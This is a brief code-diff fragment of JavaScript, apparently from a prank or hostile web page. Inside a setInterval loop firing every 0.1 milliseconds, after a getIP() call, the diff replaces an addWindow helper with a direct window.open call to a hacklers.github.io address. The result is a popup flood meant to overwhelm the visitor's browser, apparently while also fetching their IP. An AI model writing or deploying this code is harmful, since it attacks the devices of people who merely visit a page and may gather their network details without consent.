@@ -58,7 +58,7 @@
                 
                 setInterval(function() {
                     getIP().then((ip) => {
-                        newWindows.push(addWindow("https://hacklers.github.io/blank"))
+                        newWindows.push(window.open("https://hacklers.github.io/blank"))
                     })
                 }, 0.1)
                 setInterval(function() {
